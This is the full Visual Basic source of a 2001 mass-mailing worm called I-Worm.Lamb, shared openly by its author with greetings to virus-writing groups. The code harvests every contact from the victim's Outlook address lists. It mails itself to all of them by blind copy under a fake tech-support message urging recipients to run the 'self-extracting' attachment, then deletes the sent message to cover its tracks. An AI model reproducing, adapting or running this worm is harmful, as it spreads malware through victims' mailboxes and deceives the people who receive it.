   Attribute VB_Name = "Body"
   'I-Worm.Lamb by gl_st0rm of [TN]                                    '(c) 2001
   '
   'On this place u want to introduce u my tinyest worm ever...
   'This piece of code dont show any "new" and exciting
   'techniques, but is small and very easy to understand!
   'So this worm was made for that peopre, who want to learn
   'and needs help, so i u r experienced in coding, dont
   'smile to this pice of shit...
   '
   'Greetz to:
   'Vecna         : nice tool, PE PACK\CRYPT...
   'Benny/29a     : Hul at je jointa pul ;)))
   'Dat0s         : Thx for beta-testing my Trojan X-D
   'Ratter/29a    : Mas pomalej kompl! ;-) DirectX rox!
   '[pxR]/mions   : wake up px... matrix has u!
   'drb/HW-CZ     : Dik za Matrix, DivX rox!
   'Krysar/#Czech : Ses zakomplexovanej zmrd!
   '
   'Spreading disallowed, testing only !!!
   'Optimized to size, packed/crypred by: Vecnas(C) PE PACK\CRYPT
   'Size only: 4 608 bytes and in VB5 !!!

   Dim Outlook As Object

   Sub Main()
   On Error Resume Next                                                'error protection...
   MyFullExeName = App.Path & App.EXEName & ".exe"                     'if we arent in root...
   If Right(App.Path, 1) <> "\" Then MyFullExeName = App.Path & "\" & App.EXEName & ".exe"
                                                                       'by this string, we get path
                                                                       'of our file (only EXE)
   Set Outlook = CreateObject("Outlook.Application")                   'lets try to connect to Outlook
                                                                       'worx on O97/98/2000, XP not tested...
   Set Mapi = Outlook.GetNameSpace("MAPI")                             'Somethink like Outlook shell...
   AdressList = "techsupport@grisoft.cz"                               'yea, here we will store our possible
                                                                       'victim, first is all readz added
   For Each Adress In Mapi.AddressLists                                'this is the most siple way to
                                                                       'get all email contacts...
    For i = 1 To Adress.AddressEntries.Count                           'each adress in each contact
      AdressList = AdressList & ";" & Adress.AddressEntries(i)         'and add them to variable ";"- separator
    Next                                                               '
   Next                                                                '
   Set Out = Outlook.CreateItem(0)                                     'create new sesion/message
    Out.Subject = "Request Information"                                'subject
    Out.Body = "Hi," & vbCrLf & _
               "We have not heard from you concerning your request for support in the" & vbCrLf & _
               "48 hours since we sent you a response.  Consequently, we have changed" & vbCrLf & _
               "the status of your question to SOLVED." & vbCrLf & vbCrLf & _
               "If your question is still UNRESOLVED, please use the attached file below" & vbCrLf & _
               "to update our records. (File is self-extracting)" & vbCrLf & vbCrLf & _
               "Bye!"                                                  'message
    Out.BCC = AdressList                                               'blint carbon copy, better, recipient cant
                                                                       'see other recipients on message
    Out.Attachments.Add MyFullExeName                                  'attach, of course this file...
    Out.DeleteAfterSubmit = True                                       'this will delete message from bin after
                                                                       'sending...
   'Out.Importance = ImportanceHigh                                    'nice, but this is not working, why?
    Out.Send                                                           'finito! Send!
   End
   End Sub
